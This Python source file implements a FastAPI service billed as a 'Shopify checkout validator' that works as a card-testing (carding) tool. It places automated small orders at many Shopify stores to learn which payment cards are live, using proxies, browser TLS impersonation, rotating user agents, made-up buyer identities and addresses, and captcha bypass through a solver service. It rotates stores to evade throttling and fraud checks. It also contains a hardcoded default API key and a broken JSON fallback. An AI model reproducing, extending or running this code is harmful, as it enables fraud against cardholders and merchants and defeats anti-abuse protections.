"""
Shopify Checkout Validator API â€” VPS Edition (with Captcha Solver)
High-performance, fully async, production-ready.
s
Endpoints:
  GET /shopify?site={site}&cc={capythonrd}&proxy={proxy}&key={key}
  GET /check?site={site}&card={card}&proxy={proxy}&key={key}
  GET /health
  GET /stats

Card formats:  cc|mm|yy|cvv  or  cc|mm|yyyy|cvv
Proxy formats: ip:port  |  ip:port:user:pass  |  host:port:user:pass  |  scheme://...
"""

import asyncio
import json
import contextlib
import copy
import importlib
import logging
import os
import random
import re
import time
from collections import defaultdict
from contextlib import asynccontextmanager
from typing import Any, Optional, Literal
from urllib.parse import urlparse

import aiohttp
from curl_cffi.requests import AsyncSession, RequestsError
try:
    orjson = importlib.import_module("orjson")
except ImportError:  # pragma: no cover - fallback for minimal environments
    import json as _json

    class _OrjsonShim:
        JSONDecodeError = _json.JSONDecodeError

        @staticmethod
        def dumps(obj, *args, **kwargs):
            return _json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode("utf-8")

        @staticmethod
        def loads(obj, *args, **kwargs):
            return _orjson.loads(obj, *args, **kwargs)

    orjson = _OrjsonShim()

import uvicorn
from fastapi import FastAPI, Query, Request, Body
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
from dotenv import load_dotenv
load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"))

# The TLS fingerprint the stores are asked with.  The newest
# Chrome profile is refused by them (503), an older one is
# answered, so the older profile is the one that works.
IMPERSONATE = os.environ.get("SHOPIFY_IMPERSONATE", "chrome131")

# ---------------------------------------------------------------------------
# Configuration from environment
# ---------------------------------------------------------------------------
PORT             = int(os.environ.get("PORT", 8080))
WORKERS          = int(os.environ.get("WORKERS", 1))
CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
MAX_PRICE        = float(os.environ.get("MAX_PRICE", 5.0))
# How many times the price of the thing the ceiling of the order is.
# The delivery and the tax are not small, and a shop whose delivery
# is dear is a good shop still.
TOTAL_MAX_FACTOR = float(os.environ.get("TOTAL_MAX_FACTOR", "3"))

# The names of the things a shop puts beside its goods: a donation, a
# return, a bit of protection, a tip.  They are cheap and they are
# sold, but they are not the goods, so they are passed over.
ADD_ON_WORDS = (
    "donation", "donate", "free return", "package protection",
    "shipping protection", "protection plan", "warranty", "gift card",
    "giftcard", "tip", "gratuity", "optional", "add-on", "addon",
    "insurance", "savings plan", "installment",
)


def _is_an_add_on(title: str) -> bool:
    """True when the thing is an add-on and not a real good."""
    low = str(title or "").strip().lower()
    if not low:
        return False
    return any(word in low for word in ADD_ON_WORDS)
# A floor for the product price.  With one, the check buys a product that
# is worth something -- a $1 to $2 item instead of the cheapest sticker
# in the shop.
MIN_PRICE        = float(os.environ.get("MIN_PRICE", 0.0))
SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 10))
POOL_SIZE        = int(os.environ.get("POOL_SIZE", 500))
POOL_PER_HOST    = int(os.environ.get("POOL_PER_HOST", 25))
CONNECT_TIMEOUT  = float(os.environ.get("CONNECT_TIMEOUT", 8))


REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 35))
PROXY_REQUEST_TIMEOUT = float(os.environ.get("PROXY_REQUEST_TIMEOUT", 12))
CACHE_TTL        = float(os.environ.get("CACHE_TTL", 300))
LOG_LEVEL        = os.environ.get("LOG_LEVEL", "warning").upper()
LOG_FILE         = os.environ.get("LOG_FILE", "requests.txt")

# â”€â”€â”€ API authentication â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
VALID_API_KEYS = set(
    k.strip()
    for k in os.environ.get("API_KEYS", "oozaruhshop").split(",")
    if k.strip()
)

# â”€â”€â”€ Captcha Solver â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
CAPTCHA_API_KEY  = os.environ.get("CAPTCHA_API_KEY", "")
CAPTCHA_API_BASE = os.environ.get("CAPTCHA_API_BASE", "https://realapi.dev")

RealSolverCaptchaType = Literal["recaptchaV3", "hcaptcha_motion", "turnstile"]

# â”€â”€â”€ Known card responses â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
KNOWN_CARD_RESPONSES = frozenset({
    "ORDER_PLACED",
    "INSUFFICIENT_FUNDS",
    "INVALID_CVC",
    "3DS_REQUIRED",
    "OTP_REQUIRED",
    "EXPIRED_CARD",
    "INVALID_CARD",
    "CARD_DECLINED",
    "FRAUD_SUSPECTED",
    "DECISION_RULE_BLOCK",
    "DO_NOT_HONOR",
    "PROCESSING_ERROR",
    "GENERIC_DECLINE",
    "AMOUNT_TOO_SMALL",
    "INCORRECT_NUMBER",
    "PICK_UP_CARD",
    "TEST_MODE_LIVE_CARD",
    "INVALID_PURCHASE_TYPE",
    "INVALID_PAYMENT_METHOD",
    "STOLEN_CARD",
    "LOST_CARD",
    "RESTRICTED_CARD",
})

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.WARNING),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("shopify")

# ---------------------------------------------------------------------------
# Request / Response file logger
# ---------------------------------------------------------------------------
import aiofiles
import datetime

_log_lock = asyncio.Lock()
_SEP      = "=" * 70


# The request log grows by megabytes a day.  It is rotated when it
# gets too big, so a busy scan cannot fill the disk.
LOG_MAX_BYTES = int(os.environ.get("LOG_MAX_BYTES", 50 * 1024 * 1024))


async def _write_log(entry: str) -> None:
    async with _log_lock:
        try:
            try:
                if os.path.exists(LOG_FILE) and \
                        os.path.getsize(LOG_FILE) > LOG_MAX_BYTES:
                    os.replace(LOG_FILE, LOG_FILE + ".1")
            except Exception:
                pass
            async with aiofiles.open(LOG_FILE, mode="a", encoding="utf-8") as f:
                await f.write(entry)
        except Exception as ex:
            log.warning("Failed to write request log: %s", ex)


def _truncate(text: str, limit: int = 3000) -> str:
    if len(text) > limit:
        return text[:limit] + f"\n... [truncated {len(text) - limit} chars]"
    return text


async def _log_incoming(request: "Request", response_body: bytes,
                        status_code: int, elapsed_ms: float) -> None:
    now    = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    method = request.method
    url    = str(request.url)
    path   = request.url.path
    params = dict(request.query_params)
    client = request.client.host if request.client else "unknown"
    try:
        body_str = response_body.decode("utf-8", errors="replace")
    except Exception:
        body_str = "<binary>"
    entry = (
        f"\n{_SEP}\n"
        f"[{now}]  INCOMING  {method} {url}\n"
        f"Client   : {client}\n"
        f"Path     : {path}\n"
        f"Params   : {params}\n"
        f"Status   : {status_code}\n"
        f"Time     : {elapsed_ms:.1f}ms\n"
        f"Response :\n{_truncate(body_str)}\n"
        f"{_SEP}\n"
    )
    asyncio.create_task(_write_log(entry))


async def _log_outgoing(method: str, url: str, req_body,
                        status_code: int, resp_text: str,
                        elapsed_ms: float, label: str = "") -> None:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        if isinstance(req_body, bytes):
            rb = req_body.decode("utf-8", errors="replace")
        elif req_body is None:
            rb = ""
        else:
            rb = str(req_body)
    except Exception:
        rb = "<unreadable>"
    entry = (
        f"\n{_SEP}\n"
        f"[{now}]  OUTGOING  {method} {url}"
        + (f"  [{label}]" if label else "") + "\n"
        f"Status   : {status_code}\n"
        f"Time     : {elapsed_ms:.1f}ms\n"
        f"Req Body :\n{_truncate(rb, 1500)}\n"
        f"Response :\n{_truncate(resp_text, 3000)}\n"
        f"{_SEP}\n"
    )
    asyncio.create_task(_write_log(entry))


# ---------------------------------------------------------------------------
# LoggedSession â€” wraps AsyncSession and logs every request
# ---------------------------------------------------------------------------
class LoggedSession:
    def __init__(self, session: "AsyncSession"):
        self._s = session

    async def _call(self, method: str, url: str, label: str = "",
                    data=None, json=None, **kwargs):
        t0 = time.time()
        req_body = data if data is not None else (
            orjson.dumps(json) if json is not None else None
        )
        try:
            if json is not None:
                resp = await getattr(self._s, method.lower())(url, json=json, **kwargs)
            elif data is not None:
                resp = await getattr(self._s, method.lower())(url, data=data, **kwargs)
            else:
                resp = await getattr(self._s, method.lower())(url, **kwargs)
            elapsed = (time.time() - t0) * 1000
            try:
                resp_text = resp.text
            except Exception:
                resp_text = "<unreadable>"
            asyncio.create_task(
                _log_outgoing(method.upper(), url, req_body,
                              resp.status_code, resp_text, elapsed, label)
            )
            return resp
        except Exception as exc:
            elapsed = (time.time() - t0) * 1000
            asyncio.create_task(
                _log_outgoing(method.upper(), url, req_body,
                              0, f"EXCEPTION: {type(exc).__name__}: {exc}",
                              elapsed, label)
            )
            raise

    async def get(self, url: str, label: str = "", **kwargs):
        return await self._call("GET", url, label=label, **kwargs)

    async def post(self, url: str, label: str = "", data=None, json=None, **kwargs):
        return await self._call("POST", url, label=label, data=data, json=json, **kwargs)

    def __getattr__(self, name):
        return getattr(self._s, name)


# ---------------------------------------------------------------------------
# Captcha Solver
# ---------------------------------------------------------------------------
async def captcha_solver(
    page_url: str,
    site_key: str,
    *,
    captcha_type: RealSolverCaptchaType,
    max_wait: float = 90.0,
    debug: bool = False,
    **captcha_kwargs,
):
    """The captcha is answered by the captcha api we run ourselves.

    The shops ask for the pictures, and there are no eyes here to read
    them, so the answer is asked of the api on this machine, which has
    a browser and the manual way for a person.

    The api is asked in the old way: in.php takes the work and gives
    a number, and res.php is asked again until the answer is ready.

    The service outside is not used: its name does not answer, and the
    name that does answer does not accept connections.
    """
    base = os.environ.get("CAPTCHA_API_URL", "http://127.0.0.1:8090").rstrip("/")
    key = os.environ.get("CAPTCHA_API_KEY", "")
    if not key:
        try:
            bot_dir = os.path.join(os.path.dirname(os.path.dirname(
                os.path.abspath(__file__))), "bot")
            with open(os.path.join(bot_dir, "captcha_api_key.txt")) as f:
                key = f.read().strip()
        except Exception:
            key = ""
    if not key:
        return {"error": "there is no key for the captcha api"}

    import aiohttp

    params = {"key": key, "method": captcha_type, "pageurl": page_url,
              "json": 1, "sitekey": site_key}
    if captcha_kwargs.get("rqdata"):
        params["data"] = captcha_kwargs["rqdata"]

    timeout = aiohttp.ClientTimeout(total=30)
    try:
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get("%s/in.php" % base, params=params) as r:
                first = await r.json(content_type=None)
    except Exception as e:
        return {"error": "the captcha api would not take the work: %s" % str(e)[:90]}

    if not isinstance(first, dict) or first.get("status") != 1:
        return {"error": "the captcha api would not take the work: %s"
                % (first.get("request") if isinstance(first, dict) else first)}
    job = first.get("request") or ""
    if not job:
        return {"error": "the captcha api gave no number for the work"}

    deadline = time.time() + max_wait
    while time.time() < deadline:
        await asyncio.sleep(2)
        try:
            async with aiohttp.ClientSession(timeout=timeout) as s:
                async with s.get("%s/res.php" % base,
                                 params={"key": key, "action": "get",
                                         "id": job, "json": 1}) as r:
                    res = await r.json(content_type=None)
        except Exception:
            continue
        if not isinstance(res, dict):
            continue
        if res.get("status") == 1 and res.get("request"):
            token = str(res["request"]).strip()
            if token and token.lower() not in ("capcha_unavailable",
                                              "error_captcha_unavailable"):
                return {"token": token}
        if res.get("status") == 0 and res.get("request"):
            said = str(res["request"])
            # "not ready" is not the end of the work: the api is asked
            # again until the answer is there or the time is up.
            if said.upper() in ("CAPCHA_NOT_READY", "NOT_READY",
                                 "CAPTCHA_STILL_RUNNING"):
                continue
            return {"error": said[:90]}

    return {"error": "the captcha api did not answer in %.0fs" % max_wait}


async def detect_and_solve_captcha(site_url: str, html: str, debug: bool = False):
    """Detect and solve any captcha present on the page."""
    html_lower = html.lower()

    if "hcaptcha" in html_lower:
        m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
        if m:
            if debug:
                log.warning("[CAPTCHA] hCaptcha sitekey=%s", m.group(1))
            r = await captcha_solver(site_url, m.group(1),
                                     captcha_type="hcaptcha_motion", debug=debug)
            return r.get("token")

    if "recaptcha" in html_lower:
        m = (re.search(r'grecaptcha\.execute\(["\']([^"\']+)["\']', html)
             or re.search(r'data-sitekey=["\']([^"\']+)["\']', html))
        if m:
            if debug:
                log.warning("[CAPTCHA] reCAPTCHA sitekey=%s", m.group(1))
            r = await captcha_solver(site_url, m.group(1),
                                     captcha_type="recaptchaV3", debug=debug)
            return r.get("token")

    if "turnstile" in html_lower:
        m = (re.search(r'cf-turnstile[^>]*data-sitekey=["\']([^"\']+)["\']', html)
             or re.search(r'turnstile\.render\([^,]+,\s*\{\s*sitekey:\s*["\']([^"\']+)["\']', html))
        if m:
            if debug:
                log.warning("[CAPTCHA] Turnstile sitekey=%s", m.group(1))
            r = await captcha_solver(site_url, m.group(1),
                                     captcha_type="turnstile", debug=debug)
            return r.get("token")

    return None


# ---------------------------------------------------------------------------
# GraphQL Queries
# ---------------------------------------------------------------------------
_PROPOSAL_VARS = (
    "$sessionInput:SessionTokenInput!,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$checkpointData:String,$queueToken:String,"
    "$reduction:ReductionInput,"
    "$availableRedeemables:AvailableRedeemablesInput,"
    "$tip:TipTermInput,$note:NoteInput,"
    "$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,"
    "$scriptFingerprint:ScriptFingerprintInput,"
    "$transformerFingerprintV2:String,"
    "$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,"
    "$captcha:CaptchaInput,$poNumber:String,"
    "$saleAttributions:SaleAttributionsInput,"
    "$alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$deliveryExpectations:DeliveryExpectationTermsInput,"
    "$memberships:MembershipsInput,"
    "$cartMetafields:[CartMetafieldOperationInput!]"
)

_PROPOSAL_ARGS = (
    "delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
    "reduction:$reduction,availableRedeemables:$availableRedeemables,"
    "tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,"
    "captcha:$captcha,saleAttributions:$saleAttributions,"
    "alternativePaymentCurrency:$alternativePaymentCurrency,"
    "deliveryExpectations:$deliveryExpectations,"
    "memberships:$memberships,"
    "cartMetafields:$cartMetafields"
)

_SELLER_PROPOSAL_FIELDS = (
    "sellerProposal{"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "total{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "delivery{__typename "
    "...on FilledDeliveryTerms{deliveryLines{"
    "availableDeliveryStrategies{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "estimatedTimeInTransit{...on IntValueConstraint{value}}}}"
    "selectedDeliveryStrategy{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}"
    "tax{__typename "
    "...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}}"
    "payment{__typename "
    "...on FilledPaymentTerms{paymentFlexibilityPaymentTermsTemplate{id "
    "type translatedName} availablePaymentLines{"
    "paymentMethod{__typename "
    "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}" 
    "__typename}"
)

QUERY_PROPOSAL_SHIPPING = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
)

_RECEIPT_FRAGMENT = (
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on PaymentFailed{code messageUntranslated __typename}"
    "__typename}__typename}__typename}"
)

QUERY_PROPOSAL_DELIVERY = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
    + _RECEIPT_FRAGMENT
)

MUTATION_SUBMIT = (
    "mutation SubmitForCompletion("
    "$input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],"
    "$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput)"
    "{submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields "
    "postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{"
    "errors{code localizedMessage nonLocalizedMessage __typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}__typename}"
    "...on TooManyRequests{__typename}"
    "...on TooManyAttempts{__typename}"
    "__typename}}"
    + _RECEIPT_FRAGMENT
)

QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!)"
    "{receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken})"
    "{...ReceiptDetails __typename}}"
    + _RECEIPT_FRAGMENT
)

# ---------------------------------------------------------------------------
# Static data
# ---------------------------------------------------------------------------
C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "NZD": "NZ", "SGD": "SG", "MYR": "MY",
    "PHP": "PH", "THB": "TH", "ZAR": "ZA", "BRL": "BR",
    "MXN": "MX", "SEK": "SE", "NOK": "NO", "DKK": "DK",
    "JPY": "JP", "KRW": "KR",
}

ADDRESS_BOOK: dict[str, dict] = {
    "US": {"address1": "123 Main St",       "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
    "CA": {"address1": "88 Queen St W",     "city": "Toronto",     "postalCode": "M5J2J3",  "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London",      "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road",      "city": "Mumbai",      "postalCode": "400001",  "zoneCode": "MH",  "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Khalifa Tower","city": "Dubai",       "postalCode": "00000",   "zoneCode": "DU",  "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "88 Nathan Road",    "city": "Kowloon",     "postalCode": "000000",  "zoneCode": "KLN", "countryCode": "HK", "phone": "55555555"},
    "CH": {"address1": "Gotthardstrasse 17","city": "Schwyz",      "postalCode": "6430",    "zoneCode": "SZ",  "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place",    "city": "Sydney",      "postalCode": "2000",    "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Unter den Linden 1","city": "Berlin",      "postalCode": "10117",   "zoneCode": "BE",  "countryCode": "DE", "phone": "3012345678"},
    "FR": {"address1": "1 Rue de Rivoli",   "city": "Paris",       "postalCode": "75001",   "zoneCode": "IDF", "countryCode": "FR", "phone": "142123456"},
    "NZ": {"address1": "1 Queen Street",    "city": "Auckland",    "postalCode": "1010",    "zoneCode": "AUK", "countryCode": "NZ", "phone": "98765432"},
    "SG": {"address1": "1 Raffles Place",   "city": "Singapore",   "postalCode": "048616",  "zoneCode": "01",  "countryCode": "SG", "phone": "61234567"},
    "JP": {"address1": "1-1 Marunouchi",    "city": "Tokyo",       "postalCode": "100-0005","zoneCode": "13",  "countryCode": "JP", "phone": "312345678"},
    "BR": {"address1": "Av. Paulista 1000", "city": "Sao Paulo",   "postalCode": "01310-100","zoneCode": "SP", "countryCode": "BR", "phone": "1112345678"},
    "MX": {"address1": "Paseo de la Reforma 1","city": "Mexico City","postalCode": "06600", "zoneCode": "CMX","countryCode": "MX", "phone": "5512345678"},
    "SE": {"address1": "Drottninggatan 1",  "city": "Stockholm",   "postalCode": "11151",   "zoneCode": "AB",  "countryCode": "SE", "phone": "812345678"},
    "DEFAULT": {"address1": "123 Main St",  "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
}

FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas",
               "Mary","Patricia","Jennifer","Linda","Barbara","Susan","Jessica","Sarah","Karen",
               "Emily","Ashley","Daniel","Matthew","Andrew","Joshua","Christopher","Ryan","Tyler"]
LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez",
               "Martinez","Hernandez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Lee",
               "White","Harris","Martin","Thompson","Turner","Mitchell","Campbell","Roberts","Evans"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.com","hotmail.com",
                 "live.com","mail.com","aol.com"]

# A good user agent, for the times when there is not one to hand.
# A request that does not say which browser it is is a request
# that is turned away at once.
_GOOD_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
]

class _PriceOverMax(Exception):
    """Raised when the real total (product + shipping + tax) is over the cap.

    Not a site error -- the next cheap product may still fit, so the caller
    retries with another candidate.
    """


# ---------------------------------------------------------------------------
# Global process-level state
# ---------------------------------------------------------------------------
_shared_session: Optional[LoggedSession] = None
_site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
    lambda: asyncio.Semaphore(SITE_CONCURRENCY)
)

_product_cache: dict[str, dict] = {}

# Which store gets the next check.  The stores take turns, so a mass
# run is spread over them.
_site_turn = 0

# How long the last check at each store took.  The shops answer at
# anything from four seconds to a minute and a half, and a card that
# goes to a slow shop waits for it: the quick shops are asked first.
_store_time: dict[str, float] = {}

# What the shops are like is written down, so a service that is
# started again does not have to learn it all over again.
_STORE_TIME_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                "shop_times.json")


def _save_the_store_times() -> None:
    try:
        with open(_STORE_TIME_FILE, "wb") as f:
            f.write(orjson.dumps(_store_time))
    except Exception:
        pass


def _load_the_store_times() -> None:
    try:
        with open(_STORE_TIME_FILE, "r", encoding="utf-8") as f:
            data = orjson.loads(f.read())
        if isinstance(data, dict):
            for host, seconds in data.items():
                try:
                    _store_time[str(host)] = float(seconds)
                except (TypeError, ValueError):
                    continue
    except Exception:
        pass

# A shop that answers within this many seconds is a quick one.
SHOP_QUICK_SECONDS = float(os.environ.get("SHOP_QUICK_SECONDS", 12.0))

# One product fetch per store at a time.  Without this, every worker
# that starts at the same moment asks the store for its product list
# and the store answers none of them -- the product endpoint is the
# first thing a store throttles, and 24 workers hitting it together
# turned a whole scan into "No products found".
_product_locks: dict[str, asyncio.Lock] = defaultdict(asyncio.Lock)

# A fetch that FAILED is only remembered for a short time.  A store
# that throttled one request must not be written off for the whole
# cache life: that turned a five second hiccup into five minutes of
# "No products found" for every card.
PRODUCT_FAIL_TTL = float(os.environ.get("PRODUCT_FAIL_TTL", 20))

# A store that said it was tired of being asked is remembered for
# longer than an ordinary failure: a throttle lasts, and asking again
# straight away only makes it last longer.
PRODUCT_THROTTLE_TTL = float(os.environ.get("PRODUCT_THROTTLE_TTL", 300))

# A store that throttles us is put aside for this long, so the cards
# go to the stores that still answer instead of all going to the same
# tired one.
THROTTLE_BLOCK_SECONDS = float(os.environ.get("THROTTLE_BLOCK_SECONDS", 90))

# The stores that are being asked too much right now.
_throttle_block: dict[str, float] = {}

# A shop that does not take cards at all is put aside for a long time.
# Asking it again is a waste of the card's time: it will say the same.
_no_gateway_block: dict[str, float] = {}
NO_GATEWAY_BLOCK_SECONDS = float(os.environ.get("NO_GATEWAY_BLOCK_SECONDS", 86400))

# How long a card waits for another card's fetch of the same shop
# before it fetches the goods itself.  A card cannot wait for ever.
PRODUCT_LOCK_WAIT = float(os.environ.get("PRODUCT_LOCK_WAIT", 8.0))


def _product_cache_ttl(entry: dict) -> float:
    """How long this cache entry may be used."""
    if not entry:
        return 0.0
    if entry.get("ok"):
        return CACHE_TTL
    if entry.get("throttled"):
        return PRODUCT_THROTTLE_TTL
    return PRODUCT_FAIL_TTL

_cards_cache: list[dict] = []
_cards_loaded_at: float  = 0.0


# ---------------------------------------------------------------------------
# App lifecycle
# ---------------------------------------------------------------------------
@asynccontextmanager
async def lifespan(app: FastAPI):
    global _shared_session
    _shared_session = LoggedSession(AsyncSession(impersonate=IMPERSONATE, timeout=REQUEST_TIMEOUT))
    # The proxy pool is checked in the background.  The service has to
    # start serving at once: a check that arrives while it is still
    # starting is a failed check.  Until the check is done the pool is
    # used as it is.
    try:
        asyncio.create_task(_healthy_pool())
    except Exception:
        pass
    try:
        asyncio.create_task(_warm_the_shops())
    except Exception:
        pass
    _load_the_store_times()
    _reload_cards()
    log.warning("Shopify Validator API started pool=%d/host concurrency=%d/site keys=%d",
                POOL_SIZE, SITE_CONCURRENCY, len(VALID_API_KEYS))
    yield
    if _shared_session:
        res = _shared_session.close()
        if asyncio.iscoroutine(res):
            await res


app = FastAPI(title="Shopify Validator", version="3.3.0", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

_stats: dict[str, int] = defaultdict(int)


# ---------------------------------------------------------------------------
# Utility helpers
# ---------------------------------------------------------------------------

SITES_FILE = os.environ.get("SITES_FILE", "site.txt")
_sites_cache: list[str] = []
_sites_loaded_at: float = 0.0

# The shops that are not asked at all: a shop that puts up a challenge
# for every card is a shop that never answers about the card, and a
# card that waits for it is a card that is late.
#
# The names are in a file on the machine, one a line:
#   /root/hitchecker/hitchk-app/shopify-api/skip_sites.txt
SKIP_SITES_FILE = os.environ.get(
    "SKIP_SITES_FILE",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "skip_sites.txt"))
_skip_sites_cache: set[str] = set()
_skip_sites_at: float = 0.0


def _load_skip_sites() -> set[str]:
    """The shops that are not asked at all."""
    global _skip_sites_cache, _skip_sites_at
    import time as _t
    now = _t.time()
    if _skip_sites_cache and now - _skip_sites_at < 300:
        return _skip_sites_cache
    out: set[str] = set()
    try:
        with open(SKIP_SITES_FILE, encoding="utf-8") as f:
            for line in f:
